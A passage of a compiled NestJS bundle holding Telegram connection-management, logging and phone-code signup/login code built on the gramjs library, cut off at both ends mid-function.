                delete clientInfo.nextRetryAt;
                delete clientInfo.lastError;
                this.clients.set(mobile, clientInfo);
                this.logger.logOperation(mobile, 'Retry connection successful');
                return clientInfo.client;
            }
            throw new Error('Connection validation failed after retry');
        }
        catch (error) {
            return this.handleConnectionError(mobile, clientInfo, error);
        }
    }
    async handleConnectionError(mobile, clientInfo, error) {
        clientInfo.lastError = error.message;
        clientInfo.consecutiveFailures++;
        clientInfo.state = 'error';
        if (this.shouldRetry(clientInfo, error.message)) {
            const delay = this.calculateRetryDelay(clientInfo.connectionAttempts, clientInfo.retryConfig);
            clientInfo.nextRetryAt = Date.now() + delay;
            this.clients.set(mobile, clientInfo);
            this.logger.logOperation(mobile, `Connection failed, will retry in ${delay}ms. Attempt ${clientInfo.connectionAttempts}/${clientInfo.retryConfig.maxAttempts}`);
        }
        else {
            this.logger.logOperation(mobile, 'Connection failed with non-retryable error or max attempts reached');
            await this.unregisterClient(mobile);
        }
        const errorDetails = (0, parseError_1.parseError)(error, mobile, false);
        throw new common_1.BadRequestException(errorDetails.message);
    }
    async createNewClient(mobile, retryConfig, options) {
        if (!this.usersService) {
            throw new common_1.InternalServerErrorException('UsersService not initialized');
        }
        const users = await this.usersService.search({ mobile });
        const user = users[0];
        if (!user) {
            throw new common_1.BadRequestException('User not found');
        }
        this.logger.logOperation(mobile, 'Creating new client', {
            autoDisconnect: options.autoDisconnect,
            handler: options.handler,
            retryConfig
        });
        const telegramManager = new TelegramManager_1.default(user.session, user.mobile);
        const clientInfo = {
            client: telegramManager,
            lastUsed: Date.now(),
            autoDisconnect: options.autoDisconnect,
            connectionAttempts: 1,
            state: 'connecting',
            retryConfig,
            consecutiveFailures: 0,
            cleanupAttempts: 0
        };
        this.clients.set(mobile, clientInfo);
        try {
            const client = await telegramManager.createClient(options.handler);
            if (client) {
                clientInfo.state = 'connected';
                clientInfo.consecutiveFailures = 0;
                clientInfo.lastSuccessfulConnection = Date.now();
                delete clientInfo.lastError;
                delete clientInfo.nextRetryAt;
                this.clients.set(mobile, clientInfo);
                this.logger.logOperation(mobile, 'New client created successfully');
                return telegramManager;
            }
            else {
                throw new Error('Client creation returned null');
            }
        }
        catch (error) {
            this.logger.logError(mobile, 'New client creation failed', error);
            const errorDetails = (0, parseError_1.parseError)(error, mobile, false);
            try {
                await TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.ACCOUNT_LOGIN_FAILURES, `${process.env.clientId}::${mobile}\n\nAttempt: ${clientInfo.connectionAttempts}\nError: ${errorDetails.message}`);
            }
            catch (notificationError) {
                this.logger.logError(mobile, 'Failed to send error notification', notificationError);
            }
            if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', 'revoked', 'user_deactivated_ban'])) {
                this.logger.logOperation(mobile, 'Marking user as expired due to permanent error');
                try {
                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });
                }
                catch (updateError) {
                    this.logger.logError(mobile, 'Failed to mark user as expired', updateError);
                }
            }
            return this.handleConnectionError(mobile, clientInfo, error);
        }
    }
    async cleanupInactiveConnections(maxIdleTime = 180000) {
        if (this.isShuttingDown)
            return;
        this.logger.logOperation('ConnectionManager', 'Perfroming Regular Cleanup');
        const now = Date.now();
        const cleanupResults = new Map();
        const cleanupPromises = [];
        for (const [mobile, connection] of this.clients.entries()) {
            const shouldCleanup = ((connection.autoDisconnect && connection.lastUsed <= now - 100000) || connection.lastUsed <= now - this.COOLDOWN_PERIOD) &&
                (now - connection.lastUsed > maxIdleTime ||
                    connection.state === 'error' ||
                    connection.consecutiveFailures >= connection.retryConfig.maxAttempts ||
                    (connection.state === 'connecting' && now - connection.lastUsed > this.CONNECTION_TIMEOUT * 2) ||
                    (connection.cleanupAttempts && connection.cleanupAttempts >= this.MAX_CLEANUP_ATTEMPTS));
            if (shouldCleanup) {
                this.logger.logOperation(mobile, `Cleaning up connection - state: ${connection.state}, failures: ${connection.consecutiveFailures}, cleanup attempts: ${connection.cleanupAttempts || 0}`);
                const cleanupPromise = this.unregisterClient(mobile)
                    .then(() => {
                    cleanupResults.set(mobile, true);
                })
                    .catch((error) => {
                    this.logger.logError(mobile, 'Cleanup failed', error);
                    cleanupResults.set(mobile, false);
                    const clientInfo = this.clients.get(mobile);
                    if (clientInfo) {
                        clientInfo.cleanupAttempts = (clientInfo.cleanupAttempts || 0) + 1;
                        this.clients.set(mobile, clientInfo);
                    }
                });
                cleanupPromises.push(cleanupPromise);
            }
        }
        if (cleanupPromises.length > 0) {
            try {
                await Promise.race([
                    Promise.allSettled(cleanupPromises),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Cleanup timeout')), 30000))
                ]);
            }
            catch (error) {
                this.logger.logError('ConnectionManager', 'Cleanup operation timed out', error);
            }
            const failed = Array.from(cleanupResults.entries())
                .filter(([_, success]) => !success)
                .map(([mobile]) => mobile);
            if (failed.length > 0) {
                this.logger.logOperation('ConnectionManager', `Cleanup completed. Failed cleanups: ${failed.join(', ')}`);
            }
            else {
                this.logger.logOperation('ConnectionManager', `Cleanup completed successfully for ${cleanupResults.size} clients`);
            }
        }
    }
    updateLastUsed(mobile) {
        const connection = this.clients.get(mobile);
        if (connection) {
            connection.lastUsed = Date.now();
            this.clients.set(mobile, connection);
        }
    }
    hasClient(number) {
        const client = this.clients.get(number);
        return client !== undefined && client.state === 'connected';
    }
    async disconnectAll() {
        this.logger.logOperation('ConnectionManager', 'Disconnecting all clients');
        const disconnectionPromises = [];
        for (const [mobile, connection] of this.clients.entries()) {
            if (connection.state !== 'disconnected') {
                connection.state = 'disconnecting';
                this.clients.set(mobile, connection);
                disconnectionPromises.push(this.unregisterClient(mobile));
            }
        }
        try {
            await Promise.race([
                Promise.allSettled(disconnectionPromises),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Disconnect all timeout')), 60000))
            ]);
        }
        catch (error) {
            this.logger.logError('ConnectionManager', 'Disconnect all timed out', error);
        }
        this.clients.clear();
        this.logger.logOperation('ConnectionManager', 'All clients disconnected');
    }
    async unregisterClient(mobile, timeoutMs = this.CLEANUP_TIMEOUT) {
        const clientInfo = this.clients.get(mobile);
        if (!clientInfo)
            return;
        this.logger.logOperation(mobile, 'Unregistering client', {
            state: clientInfo.state,
            lastUsed: clientInfo.lastUsed,
            autoDisconnect: clientInfo.autoDisconnect
        });
        try {
            clientInfo.state = 'disconnecting';
            await clientInfo.client.destroy();
            this.clients.delete(mobile);
        }
        catch (error) {
            this.logger.logError(mobile, 'Unregister failed', error);
        }
        try {
            await this.forceCleanupClient(mobile, clientInfo);
        }
        catch (forceError) {
            this.logger.logError(mobile, 'Force cleanup also failed', forceError);
        }
    }
    async forceCleanupClient(mobile, clientInfo) {
        if (clientInfo.client?.client) {
            this.logger.logOperation(mobile, 'Performing FORCE cleanup');
            try {
                await clientInfo.client.client.destroy();
            }
            catch (destroyError) {
                this.logger.logError(mobile, 'Force destroy failed', destroyError);
            }
        }
        try {
            if (clientInfo.client) {
                if (clientInfo.client.client) {
                    clientInfo.client.client = null;
                }
                clientInfo.client = null;
            }
        }
        catch (refError) {
            this.logger.logError(mobile, 'Reference cleanup in force mode failed', refError);
        }
        this.clients.delete(mobile);
        this.logger.logOperation(mobile, 'Client removed from map');
    }
    getActiveConnectionCount() {
        return Array.from(this.clients.values())
            .filter(client => client.state === 'connected')
            .length;
    }
    getConnectionLeakReport() {
        const activeConnections = [];
        const zombieConnections = [];
        const staleConnections = [];
        const now = Date.now();
        for (const [mobile, clientInfo] of this.clients.entries()) {
            if (clientInfo.client) {
                const isClientConnected = clientInfo.client.connected();
                const stateConnected = clientInfo.state === 'connected';
                const isStale = now - clientInfo.lastUsed > this.COOLDOWN_PERIOD * 2;
                if (isClientConnected && stateConnected) {
                    activeConnections.push(mobile);
                }
                else if (!isClientConnected && stateConnected) {
                    zombieConnections.push(mobile);
                }
                else if (isStale && clientInfo.state !== 'disconnected') {
                    staleConnections.push(mobile);
                }
            }
        }
        return {
            mapSize: this.clients.size,
            activeConnections,
            zombieConnections,
            staleConnections
        };
    }
    async performHealthCheck() {
        if (this.isShuttingDown)
            return;
        const leakReport = this.getConnectionLeakReport();
        if (leakReport.zombieConnections.length > 0) {
            this.logger.logOperation('ConnectionManager', `Health check: Detected ${leakReport.zombieConnections.length} zombie connections`);
            for (const mobile of leakReport.zombieConnections) {
                try {
                    await this.unregisterClient(mobile);
                }
                catch (error) {
                    this.logger.logError(mobile, 'Health check cleanup failed', error);
                }
            }
        }
        if (leakReport.staleConnections.length > 0) {
            this.logger.logOperation('ConnectionManager', `Health check: Detected ${leakReport.staleConnections.length} stale connections`);
            for (const mobile of leakReport.staleConnections) {
                try {
                    await this.unregisterClient(mobile);
                }
                catch (error) {
                    this.logger.logError(mobile, 'Stale connection cleanup failed', error);
                }
            }
        }
        this.logger.logOperation('ConnectionManager', `Health check completed - Active: ${leakReport.activeConnections.length}, Total: ${leakReport.mapSize}`, leakReport);
    }
    startCleanupInterval(intervalMs = 120000) {
        if (this.cleanupInterval) {
            return this.cleanupInterval;
        }
        this.stopCleanupInterval();
        this.cleanupInterval = setInterval(() => {
            if (!this.isShuttingDown) {
                this.cleanupInactiveConnections().catch(err => {
                    this.logger.logError('ConnectionManager', 'Error in cleanup interval', err);
                });
                this.performHealthCheck().catch(err => {
                    this.logger.logError('ConnectionManager', 'Error in initial health check', err);
                });
            }
        }, intervalMs);
        this.logger.logOperation('ConnectionManager', `Cleanup interval started with ${intervalMs}ms interval`);
        this.cleanupInactiveConnections().catch(err => {
            this.logger.logError('ConnectionManager', 'Error in initial cleanup', err);
        });
        return this.cleanupInterval;
    }
    stopCleanupInterval() {
        if (this.cleanupInterval) {
            clearInterval(this.cleanupInterval);
            this.logger.logOperation('ConnectionManager', 'Cleanup interval stopped');
            this.cleanupInterval = null;
        }
    }
    getClientState(mobile) {
        const client = this.clients.get(mobile);
        if (client) {
            return {
                autoDisconnect: client.autoDisconnect,
                connectionAttempts: client.connectionAttempts,
                lastUsed: client.lastUsed,
                state: client.state,
                lastError: client.lastError
            };
        }
    }
    getConnectionStats() {
        const stats = {
            total: this.clients.size,
            connected: 0,
            connecting: 0,
            disconnecting: 0,
            disconnected: 0,
            error: 0,
            retrying: 0
        };
        const now = Date.now();
        for (const client of this.clients.values()) {
            if (client.state === 'error' && client.nextRetryAt && now < client.nextRetryAt) {
                stats.retrying++;
            }
            else {
                stats[client.state]++;
            }
        }
        return stats;
    }
    getClientInfo(mobile) {
        return this.clients.get(mobile);
    }
    async forceReconnect(mobile) {
        this.logger.logOperation(mobile, 'Force reconnection requested');
        await this.unregisterClient(mobile);
        return this.getClient(mobile, { forceReconnect: true });
    }
    setRetryConfig(mobile, config) {
        const clientInfo = this.clients.get(mobile);
        if (clientInfo) {
            clientInfo.retryConfig = { ...clientInfo.retryConfig, ...config };
            this.clients.set(mobile, clientInfo);
            return true;
        }
        return false;
    }
}
ConnectionManager.instance = null;
exports.connectionManager = ConnectionManager.getInstance();


/***/ }),

/***/ "./src/components/Telegram/utils/telegram-logger.ts":
/*!**********************************************************!*\
  !*** ./src/components/Telegram/utils/telegram-logger.ts ***!
  \**********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramLogger = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
class TelegramLogger {
    constructor() {
        this.logger = new common_1.Logger('TelegramService');
    }
    static getInstance() {
        if (!TelegramLogger.instance) {
            TelegramLogger.instance = new TelegramLogger();
        }
        return TelegramLogger.instance;
    }
    shouldIncludeDetails(details) {
        return details !== undefined
            && details !== null
            && !(typeof details === 'object' && Object.keys(details).length === 0);
    }
    formatMessage(mobile, message, details) {
        return this.shouldIncludeDetails(details)
            ? `[${mobile}] ${message} - ${JSON.stringify(details)}`
            : `[${mobile}] ${message}`;
    }
    logOperation(mobile, operation, details) {
        this.logger.log(this.formatMessage(mobile, operation, details));
    }
    logError(mobile, operation, error) {
        this.logger.error(`[${mobile}] ${operation} failed - ${error.message}`, error.stack);
    }
    logWarning(mobile, message, details) {
        this.logger.warn(this.formatMessage(mobile, message, details));
    }
    logDebug(mobile, message, details) {
        this.logger.debug(this.formatMessage(mobile, message, details));
    }
}
exports.TelegramLogger = TelegramLogger;


/***/ }),

/***/ "./src/components/TgSignup/dto/tg-signup.dto.ts":
/*!******************************************************!*\
  !*** ./src/components/TgSignup/dto/tg-signup.dto.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupResponse = exports.VerifyCodeDto = exports.SendCodeDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SendCodeDto {
}
exports.SendCodeDto = SendCodeDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone number to send the verification code to (international format)',
        example: '+919876543210'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\+\d{8,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SendCodeDto.prototype, "phone", void 0);
class VerifyCodeDto {
}
exports.VerifyCodeDto = VerifyCodeDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone number used for verification (international format)',
        example: '919876543210'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\+\d{8,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "phone", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Verification code received',
        example: '12345'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\d{5}$/, { message: 'Code must be exactly 5 digits' }),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "code", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Two-factor authentication password if required',
        example: 'yourSecurePassword123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => value === '' ? undefined : value),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "password", void 0);
class TgSignupResponse {
}
exports.TgSignupResponse = TgSignupResponse;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Operation status code',
        example: 200
    }),
    __metadata("design:type", Number)
], TgSignupResponse.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Response message',
        example: 'Login successful'
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone code hash for verification',
        example: 'abc123xyz',
        required: false
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "phoneCodeHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the code was sent via app',
        example: true,
        required: false
    }),
    __metadata("design:type", Boolean)
], TgSignupResponse.prototype, "isCodeViaApp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session string for authenticated client',
        required: false
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether 2FA is required',
        example: false,
        required: false
    }),
    __metadata("design:type", Boolean)
], TgSignupResponse.prototype, "requires2FA", void 0);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.controller.ts":
/*!*********************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.controller.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var TgSignupController_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const tg_signup_service_1 = __webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts");
const tg_signup_dto_1 = __webpack_require__(/*! ./dto/tg-signup.dto */ "./src/components/TgSignup/dto/tg-signup.dto.ts");
let TgSignupController = TgSignupController_1 = class TgSignupController {
    constructor(tgSignupService) {
        this.tgSignupService = tgSignupService;
        this.logger = new common_1.Logger(TgSignupController_1.name);
    }
    async sendCode(sendCodeDto) {
        try {
            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);
            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);
            return {
                status: common_1.HttpStatus.CREATED,
                message: 'Code sent to your Telegram App',
                phoneCodeHash: result.phoneCodeHash,
                isCodeViaApp: result.isCodeViaApp
            };
        }
        catch (error) {
            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {
                error,
                stack: error.stack
            });
            throw error;
        }
    }
    async verifyCode(verifyCodeDto) {
        try {
            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);
            const result = await this.tgSignupService.verifyCode(verifyCodeDto.phone, verifyCodeDto.code, verifyCodeDto.password);
            return {
                status: result.requires2FA ? common_1.HttpStatus.BAD_REQUEST : common_1.HttpStatus.OK,
                message: result.message || 'Successfully logged in',
                session: result.session,
                requires2FA: result.requires2FA
            };
        }
        catch (error) {
            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {
                error,
                stack: error.stack
            });
            throw error;
        }
    }
};
exports.TgSignupController = TgSignupController;
__decorate([
    (0, common_1.Post)('send-code'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send verification code to phone number',
        description: 'Initiates the signup process by sending a verification code via Telegram'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.CREATED,
        type: tg_signup_dto_1.TgSignupResponse,
        description: 'Code sent successfully'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid phone number or failed to send code',
        schema: {
            type: 'object',
            properties: {
                statusCode: { type: 'number', example: 400 },
                message: { type: 'string', example: 'Invalid phone number format' },
                error: { type: 'string', example: 'Bad Request' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.TOO_MANY_REQUESTS,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
        description: 'Internal server error occurred'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [tg_signup_dto_1.SendCodeDto]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "sendCode", null);
__decorate([
    (0, common_1.Post)('verify'),
    (0, swagger_1.ApiOperation)({
        summary: 'Verify code and complete signup/login',
        description: 'Verifies the code sent to phone and completes the signup/login process'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        type: tg_signup_dto_1.TgSignupResponse,
        description: 'Verification successful'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid code or verification failed'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.TOO_MANY_REQUESTS,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
        description: 'Internal server error occurred'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [tg_signup_dto_1.VerifyCodeDto]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "verifyCode", null);
exports.TgSignupController = TgSignupController = TgSignupController_1 = __decorate([
    (0, common_1.Controller)('tgsignup'),
    (0, swagger_1.ApiTags)('tgsignup'),
    (0, swagger_1.ApiExtraModels)(tg_signup_dto_1.SendCodeDto, tg_signup_dto_1.VerifyCodeDto, tg_signup_dto_1.TgSignupResponse),
    __metadata("design:paramtypes", [tg_signup_service_1.TgSignupService])
], TgSignupController);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.module.ts":
/*!*****************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.module.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tg_signup_controller_1 = __webpack_require__(/*! ./tg-signup.controller */ "./src/components/TgSignup/tg-signup.controller.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const tg_signup_service_1 = __webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TgSignupModule = class TgSignupModule {
};
exports.TgSignupModule = TgSignupModule;
exports.TgSignupModule = TgSignupModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            (0, common_1.forwardRef)(() => users_module_1.UsersModule)
        ],
        controllers: [tg_signup_controller_1.TgSignupController],
        providers: [tg_signup_service_1.TgSignupService],
        exports: [tg_signup_service_1.TgSignupService]
    })
], TgSignupModule);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.service.ts":
/*!******************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.service.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var TgSignupService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const Password_1 = __webpack_require__(/*! telegram/Password */ "telegram/Password");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
let TgSignupService = TgSignupService_1 = class TgSignupService {
    constructor(usersService) {
        this.usersService = usersService;
        this.logger = new common_1.Logger(TgSignupService_1.name);
        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService_1.SESSION_CLEANUP_INTERVAL);
    }
    async onModuleDestroy() {
        clearInterval(this.cleanupInterval);
        const phones = Array.from(TgSignupService_1.activeClients.keys());
        await Promise.all(phones.map(phone => this.disconnectClient(phone)));
    }
    getRandomCredentials() {
        const index = Math.floor(Math.random() * TgSignupService_1.API_CREDENTIALS.length);
        return TgSignupService_1.API_CREDENTIALS[index];
    }
    async cleanupStaleSessions() {
        for (const [phone, session] of TgSignupService_1.activeClients) {
            try {
                if (Date.now() - session.createdAt > TgSignupService_1.LOGIN_TIMEOUT &&
                    (!session.client || !session.client.connected)) {
                    await this.disconnectClient(phone);
                }
            }
            catch (error) {
                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);
            }
        }
    }
    validatePhoneNumber(phone) {
        phone = phone.replace(/^\+/, '');
        if (!/^\d{8,15}$/.test(phone)) {
            throw new common_1.BadRequestException('Please enter a valid phone number');
        }
        return phone;
    }
    async disconnectClient(phone) {
        const session = TgSignupService_1.activeClients.get(phone);
        if (session) {
            try {
                clearTimeout(session.timeoutId);
                await session.client.destroy();
                this.logger.log(`Client disconnected for ${phone}`);
            }
            catch (error) {
                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);
            }
            finally {
                TgSignupService_1.activeClients.delete(phone);
            }
        }
    }
    async sendCode(phone) {
        try {
            phone = this.validatePhoneNumber(phone);
            const existingSession = TgSignupService_1.activeClients.get(phone);
            if (existingSession && existingSession.client?.connected) {
                await this.disconnectClient(phone);
            }
            const { apiId, apiHash } = this.getRandomCredentials();
            const session = new sessions_1.StringSession('');
            const client = new telegram_1.TelegramClient(session, apiId, apiHash, {
                connectionRetries: 5,
                retryDelay: 2000,
                useWSS: true,
                timeout: 30000
            });
            await client.setLogLevel(Logger_1.LogLevel.ERROR);
            await client.connect();
            const sendResult = await client.invoke(new tl_1.Api.auth.SendCode({
                phoneNumber: phone,
                apiId,
                apiHash,
                settings: new tl_1.Api.CodeSettings({
                    currentNumber: true,
                    allowAppHash: true,
                }),
            }));
            if (sendResult instanceof tl_1.Api.auth.SentCodeSuccess) {
                this.logger.error(`Unexpected immediate login for ${phone}`);
                throw new common_1.BadRequestException('Unexpected immediate login');
            }
            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService_1.LOGIN_TIMEOUT);
            TgSignupService_1.activeClients.set(phone, {
                client,
                phoneCodeHash: sendResult.phoneCodeHash,
                timeoutId,
                createdAt: Date.now()
            });
            return {
                phoneCodeHash: sendResult.phoneCodeHash,
                isCodeViaApp: sendResult.type instanceof tl_1.Api.auth.SentCodeTypeApp,
            };
        }
        catch (error) {
            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);
            await this.disconnectClient(phone);
            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {
                throw new common_1.BadRequestException('This phone number has been banned from Telegram');
            }
            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {
                throw new common_1.BadRequestException('Please enter a valid phone number');
            }
            if (error.errorMessage?.includes('FLOOD_WAIT')) {
                throw new common_1.BadRequestException('Please wait a few minutes before trying again');
            }
            throw new common_1.BadRequestException('Unable to send OTP. Please try again');
        }
    }
    async verifyCode(phone, code, password) {
        try {
            phone = this.validatePhoneNumber(phone);
            const session = TgSignupService_1.activeClients.get(phone);
            if (!session) {
                this.logger.warn(`No active signup session found for ${phone}`);
                throw new common_1.BadRequestException('Session Expired. Please start again');
            }
            clearTimeout(session.timeoutId);
            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService_1.LOGIN_TIMEOUT);
            if (!session.client?.connected) {
                try {
                    await session.client?.connect();
                }
                catch (error) {
                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);
                    try {
                        const { apiId, apiHash } = this.getRandomCredentials();
                        const newSession = new sessions_1.StringSession('');
                        const newClient = new telegram_1.TelegramClient(newSession, apiId, apiHash, {
                            connectionRetries: 5,
                            retryDelay: 2000,
                            useWSS: true,
                            timeout: 30000
                        });
                        await newClient.connect();
                        session.client = newClient;
                    }
                    catch (reconnectError) {
                        throw new common_1.BadRequestException('Connection failed. Please try verifying again.');
                    }
                }
            }
            const { client, phoneCodeHash } = session;
            try {
                this.logger.debug(`Attempting to sign in with code for ${phone}`);
                const signInResult = await client.invoke(new tl_1.Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash,
                    phoneCode: code,
                }));
                if (!signInResult) {
